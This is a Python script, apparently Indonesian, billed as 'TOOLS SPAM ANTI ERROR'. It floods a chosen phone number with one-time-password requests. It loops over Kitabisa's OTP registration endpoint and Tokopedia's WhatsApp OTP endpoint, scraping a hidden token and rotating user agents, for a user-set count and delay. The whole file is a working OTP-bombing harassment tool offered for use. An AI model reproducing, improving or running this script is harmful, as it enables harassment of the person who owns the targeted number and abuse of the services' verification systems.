import os, sys, time, json, re, random, requests

# -----------------------WARNA----------------------------
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
# -------------------------------------------------------

class Spam:
    def __init__(self, nomer):
        self.nomer = nomer

    def spam(self):
        try:
            hasil = requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}', timeout=10)
            if hasil.status_code == 200:
                return f'{h}Spamm kitabisa {self.nomer} Success!'
            elif hasil.status_code == 500:
                return f'{m}Spamm kitabisa {self.nomer} Fail!'
            else:
                return f'{m}Spamm kitabisa {self.nomer} Gagal! (status {hasil.status_code})'
        except Exception as e:
            return f'{m}Error: {str(e)}'

    def tokped(self):
        try:
            rands = random.choice(open('ua.txt').readlines()).strip()
            kirim = {
                'User-Agent': rands,
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Origin': 'https://accounts.tokopedia.com',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            }
            regist = requests.get(
                f'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={self.nomer}',
                headers=kirim, timeout=10
            ).text
            token_match = re.search(r'<input id="Token" value="(.*?)" type="hidden">', regist)
            if not token_match:
                return f'{m}Spamm Tokped {self.nomer} Token not found!'
            token = token_match.group(1)
            formulir = {
                "otp_type": "116",
                "msisdn": self.nomer,
                "tk": token,
                "email": '',
                "original_param": "",
                "user_id": "",
                "signature": "",
                "number_otp_digit": "6"
            }
            req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=kirim, data=formulir, timeout=10).text
            if 'Anda sudah melakukan 3 kali' in req:
                return f'{m}Spamm Tokped {self.nomer} Fail! (Limit tercapai)'
            else:
                return f'{h}Spamm Tokped {self.nomer} Success!'
        except Exception as e:
            return f'{m}Error: {str(e)}'

# -------------- Fungsi Utama --------------
def get_delay():
    while True:
        try:
            return float(input(k + '\tDelay (detik, bisa desimal) : ' + h))
        except ValueError:
            print(m + "\tMasukkan angka yang valid!")

def single():
    nomer = input(k + '\tPhone number : ' + h)
    total = int(input(k + '\tTotal spam : ' + h))
    dly = get_delay()
    for _ in range(total):
        z = Spam(nomer)
        print('\t' + z.spam())
        print('\t' + z.tokped())
        time.sleep(dly)

if __name__ == "__main__":
    os.system('clear')
    print(h + "TOOLS SPAM ANTI ERROR")
    single()
